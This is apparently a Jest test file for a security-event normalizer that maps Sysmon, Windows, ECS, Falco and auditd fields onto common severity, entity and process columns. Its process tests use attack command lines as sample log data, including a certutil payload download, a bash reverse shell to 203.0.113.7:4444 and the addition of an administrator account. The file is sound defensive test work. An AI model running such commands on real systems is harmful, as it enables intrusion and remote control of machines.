import { describe, expect, test } from "@jest/globals";
import NormalizedSecurityEvent from "../../../Types/SecurityEvent/NormalizedSecurityEvent";
import OcsfSeverity from "../../../Types/SecurityEvent/OcsfSeverity";
import GenericNormalizer from "../../../Utils/SecurityEvent/GenericNormalizer";

/*
 * The generic normalizer is the catch-all for arbitrary vendor JSON, so its
 * whole value is the alias tables: "level" and "priority" must grade like
 * "severity", "@timestamp" like "timestamp", "client_ip" like "source_ip".
 * Removing an alias never errors — events just quietly lose their severity
 * or entities and still ingest. These tests pin the aliases plus the safe
 * defaults (Unknown severity, "Security event" message, content-hash uid)
 * that keep an unrecognisable payload ingestable instead of dropped.
 */
describe("GenericNormalizer", () => {
  describe("severity aliases", () => {
    test.each<[string, string, OcsfSeverity]>([
      ["severity", "high", OcsfSeverity.High],
      ["level", "error", OcsfSeverity.Medium],
      ["priority", "critical", OcsfSeverity.Critical],
      ["risk_level", "low", OcsfSeverity.Low],
    ])(
      "%s: %s -> %s",
      (field: string, value: string, expected: OcsfSeverity) => {
        const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
          [field]: value,
        });

        expect(result.severityName).toBe(expected);
      },
    );

    test("unrecognised severity defaults to Unknown", () => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        severity: "sev-nonsense",
      });

      expect(result.severityName).toBe(OcsfSeverity.Unknown);
      expect(result.severityId).toBe(0);
    });
  });

  describe("message aliases", () => {
    test.each<[string, string]>([
      ["message", "from message"],
      ["msg", "from msg"],
      ["summary", "from summary"],
    ])("%s is accepted", (field: string, value: string) => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        [field]: value,
      });

      expect(result.message).toBe(value);
    });

    test("message wins over msg, and the default is 'Security event'", () => {
      expect(
        GenericNormalizer.normalize({ message: "primary", msg: "secondary" })
          .message,
      ).toBe("primary");

      expect(GenericNormalizer.normalize({ foo: "bar" }).message).toBe(
        "Security event",
      );
    });
  });

  describe("time aliases", () => {
    test("timestamp parses", () => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        timestamp: "2024-05-01T12:00:00Z",
      });

      expect(result.time.getTime()).toBe(1714564800000);
    });

    test("@timestamp parses", () => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        "@timestamp": 1714564800,
      });

      expect(result.time.getTime()).toBe(1714564800000);
    });
  });

  describe("entity aliases", () => {
    test("user/host/ip aliases fill the principal and target columns", () => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        username: "alice",
        hostname: "web-1",
        client_ip: "1.2.3.4",
        dest_ip: "5.6.7.8",
      });

      expect(result.principalUser).toBe("alice");
      expect(result.principalHost).toBe("web-1");
      expect(result.principalIp).toBe("1.2.3.4");
      expect(result.targetIp).toBe("5.6.7.8");
    });

    test("primary spellings work too", () => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        user: "bob",
        host: "db-1",
        source_ip: "9.9.9.9",
      });

      expect(result.principalUser).toBe("bob");
      expect(result.principalHost).toBe("db-1");
      expect(result.principalIp).toBe("9.9.9.9");
    });

    test("observables are built from the extracted entities", () => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        username: "alice",
        hostname: "web-1",
        client_ip: "1.2.3.4",
        dest_ip: "5.6.7.8",
      });

      expect(result.observables).toEqual([
        "alice",
        "web-1",
        "1.2.3.4",
        "5.6.7.8",
      ]);
    });
  });

  describe("class name from the event type", () => {
    test("event_type prettifies with class uid pinned to 0", () => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        event_type: "port_scan",
      });

      expect(result.classUid).toBe(0);
      expect(result.className).toBe("Port Scan");
      expect(result.categoryUid).toBe(0);
      expect(result.categoryName).toBe("Uncategorized");
    });

    test("spaces and dashes normalize before prettifying", () => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        category: "malware-detection event",
      });

      expect(result.className).toBe("Malware Detection Event");
    });

    test("without any type field the class name is Base Event", () => {
      expect(GenericNormalizer.normalize({ foo: "bar" }).className).toBe(
        "Base Event",
      );
    });
  });

  describe("eventUid", () => {
    test.each<[string, string]>([
      ["id", "id-1"],
      ["uuid", "uuid-1"],
      ["alert_id", "alert-1"],
    ])("%s is accepted", (field: string, value: string) => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        [field]: value,
      });

      expect(result.eventUid).toBe(value);
    });

    test("without an id field, falls back to the content hash", () => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        message: "no id here",
      });

      expect(result.eventUid).toMatch(/^sha256:[0-9a-f]{64}$/);
    });
  });

  describe("remaining columns", () => {
    test("vendor, product, rule and status lift from their aliases", () => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        vendor: "Acme",
        product: "AcmeEDR",
        rule_name: "Suspicious PowerShell",
        rule_id: "r-1",
        status: "blocked",
      });

      expect(result.vendorName).toBe("Acme");
      expect(result.productName).toBe("AcmeEDR");
      expect(result.ruleName).toBe("Suspicious PowerShell");
      expect(result.ruleId).toBe("r-1");
      expect(result.statusName).toBe("blocked");
    });

    test("unrecognised fields still land in attributes", () => {
      const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
        totally_custom: { deeply: "nested" },
      });

      expect(result.attributes["totally_custom.deeply"]).toBe("nested");
    });
  });
});

/*
 * Arbitrary JSON names a process every way there is: Sysmon's own field
 * names, the Windows Security log's, ECS objects, Falco's dotted
 * output_fields, auditd's comm and exe, Splunk's CIM `process`. Each lands
 * on the process fields Sigma's Image and CommandLine read.
 */
describe("GenericNormalizer: the process an event is about", () => {
  test("Sysmon's field names, flat", () => {
    const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
      EventID: 1,
      Image: "C:\\Windows\\System32\\certutil.exe",
      CommandLine: "certutil.exe -urlcache -f http://203.0.113.7/a.exe",
      ParentImage: "C:\\Windows\\System32\\cmd.exe",
      ParentCommandLine: '"C:\\Windows\\system32\\cmd.exe"',
    });

    expect(result.processPath).toBe("C:\\Windows\\System32\\certutil.exe");
    expect(result.processName).toBe("certutil.exe");
    expect(result.processCommandLine).toBe(
      "certutil.exe -urlcache -f http://203.0.113.7/a.exe",
    );
    expect(result.parentProcessPath).toBe("C:\\Windows\\System32\\cmd.exe");
    expect(result.parentProcessName).toBe("cmd.exe");
    expect(result.parentProcessCommandLine).toBe(
      '"C:\\Windows\\system32\\cmd.exe"',
    );
  });

  test("the Windows Security log's 4688, whose process names are full paths", () => {
    const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
      EventID: 4688,
      NewProcessName: "C:\\Windows\\System32\\net.exe",
      ParentProcessName: "C:\\Windows\\System32\\cmd.exe",
      CommandLine: "net localgroup administrators svc_backup /add",
    });

    expect(result.processPath).toBe("C:\\Windows\\System32\\net.exe");
    expect(result.processName).toBe("net.exe");
    expect(result.parentProcessPath).toBe("C:\\Windows\\System32\\cmd.exe");
    expect(result.parentProcessName).toBe("cmd.exe");
  });

  test("ECS objects, nested or dotted", () => {
    const nested: NormalizedSecurityEvent = GenericNormalizer.normalize({
      process: {
        name: "bash",
        executable: "/usr/bin/bash",
        command_line: "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
        parent: { name: "php-fpm8.2", command_line: "php-fpm: pool www" },
      },
    });
    const dotted: NormalizedSecurityEvent = GenericNormalizer.normalize({
      "process.name": "bash",
      "process.executable": "/usr/bin/bash",
      "process.command_line": "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
      "process.parent.name": "php-fpm8.2",
      "process.parent.command_line": "php-fpm: pool www",
    });

    for (const result of [nested, dotted]) {
      expect(result.processName).toBe("bash");
      expect(result.processPath).toBe("/usr/bin/bash");
      expect(result.processCommandLine).toBe(
        "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
      );
      expect(result.parentProcessName).toBe("php-fpm8.2");
      expect(result.parentProcessCommandLine).toBe("php-fpm: pool www");
    }
  });

  test("Falco's alert, whose output_fields keys hold dots", () => {
    const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
      output: "Terminal shell in container",
      priority: "Notice",
      rule: "Terminal shell in container",
      output_fields: {
        "proc.name": "bash",
        "proc.exepath": "/usr/bin/bash",
        "proc.cmdline": "bash -c unset HISTFILE",
        "proc.pname": "runc",
        "proc.pcmdline": "runc init",
      },
    });

    expect(result.processName).toBe("bash");
    expect(result.processPath).toBe("/usr/bin/bash");
    expect(result.processCommandLine).toBe("bash -c unset HISTFILE");
    expect(result.parentProcessName).toBe("runc");
    expect(result.parentProcessCommandLine).toBe("runc init");
  });

  test("auditd's comm and exe", () => {
    const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
      type: "SYSCALL",
      comm: "cat",
      exe: "/usr/bin/cat",
    });

    expect(result.processName).toBe("cat");
    expect(result.processPath).toBe("/usr/bin/cat");
  });

  test("a plain `process` string is the command line, last of all, and still the principal process", () => {
    const plain: NormalizedSecurityEvent = GenericNormalizer.normalize({
      process: "powershell.exe -enc JABzAD0A",
    });
    const explicit: NormalizedSecurityEvent = GenericNormalizer.normalize({
      process: "powershell.exe",
      command_line: "powershell.exe -enc JABzAD0A",
    });

    expect(plain.processCommandLine).toBe("powershell.exe -enc JABzAD0A");
    expect(plain.principalProcess).toBe("powershell.exe -enc JABzAD0A");
    expect(explicit.processCommandLine).toBe("powershell.exe -enc JABzAD0A");
  });

  test("a lowercase `image` is a container's as often as a process's, so it is left in the attributes", () => {
    const result: NormalizedSecurityEvent = GenericNormalizer.normalize({
      image: "docker.io/library/nginx:1.27",
      container_id: "4f2a",
    });

    expect(result.processPath).toBe("");
    expect(result.processName).toBe("");
    expect(result.attributes["image"]).toBe("docker.io/library/nginx:1.27");
  });
});
